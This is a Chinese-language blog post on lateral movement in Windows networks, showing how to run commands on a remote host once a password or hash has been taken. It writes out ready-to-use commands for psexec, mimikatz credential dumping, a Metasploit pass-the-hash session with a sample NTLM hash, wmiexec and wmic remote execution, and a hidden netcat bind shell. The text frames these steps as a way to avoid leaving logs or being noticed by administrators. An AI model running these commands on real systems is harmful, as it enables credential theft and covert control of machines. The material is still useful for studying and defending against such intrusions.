---
title: Windows远程执行命令
copyright: true
date: 2020-01-23 14:21:17
categories: 内网渗透
tags:
  - Windows
  - 远程命令执行
  - 内网渗透
---

<blockquote class="blockquote-center">只愿君心似我心，定不负相思意</blockquote>

　　当我们已经获取了远程系统的凭证（明文密码或 hash）时，可以直接通过3389远程登录进去收集信息、进行下一步的渗透，但是这样做的话会在系统上留下我们的操作记录，而且有可能邂逅管理员。大部分情况下，一个cmdshell 已经可以满足我们继续渗透的需求，所以不到万不得已的时候最好不要远程桌面连接(mstsc)，而是通过远程执行命令的方式继续开展工作。

<!-- more -->

### psexec.exe远程执行命令

```
psexec \\192.168.30.128 -u Administrator -p 123456789 cmd.exe
```

![](https://img-blog.csdnimg.cn/20200121181236736.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

这里一开始登陆的是另一个管理员账号，但是一直被拒绝访问，后来把Administrator账号取消隐藏，一下就连接上。之后看到一篇文章也有一样的情况，只有Administrator账号才能连接，就算是管理员用户组的其他用户也不能连接，UAC的问题。

### 使用Hash登陆Windows

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
```

![](https://img-blog.csdnimg.cn/20200121181256861.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

或者使用wce抓取hash值：

![](https://img-blog.csdnimg.cn/20200121181302526.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

msf调用payload：

```
use exploit/windows/smb/psexec
show options
set RHOST 192.168.30.128
Set SMBPass 0182BD0BD4444BF867CD839BF040D93B:C22B315C040AE6E0EFEE3518D830362B
set SMBUser Administrator
show options
Run
```

![](https://img-blog.csdnimg.cn/20200121181313817.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

### 利用wmiexec工具配合进行反弹半交互shell

```
cscript.exe //nologo wmiexec.vbs /shell 192.168.30.128 Administrator 123456789
```

![](https://img-blog.csdnimg.cn/2020012118132951.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

还可以单条命令执行

![](https://img-blog.csdnimg.cn/20200121181349926.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

### WMI执行命令方式，无回显

```
wmic /node:192.168.30.128 /user:Administrator /password:123456789  process call create "cmd.exe /c ipconfig>c:\result.txt"
```

![](https://img-blog.csdnimg.cn/2020012118140386.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

执行成功后可以在被控制的机器里面找到执行结果的文件

![](https://img-blog.csdnimg.cn/20200121181405240.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

### nc远程执行

先在被控机器上开启监听，-L：让监听者在连接多次掉线时仍坚持监听，-d：让nc隐藏运行，-e：指定要运行的程序，-p：监听的端口

```
nc.exe -L -d -e cmd.exe -p 5555
```

![](https://img-blog.csdnimg.cn/20200121181415362.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

```
控制端运行nc64.exe 192.168.30.128 5555
```

![](https://img-blog.csdnimg.cn/20200121181428164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)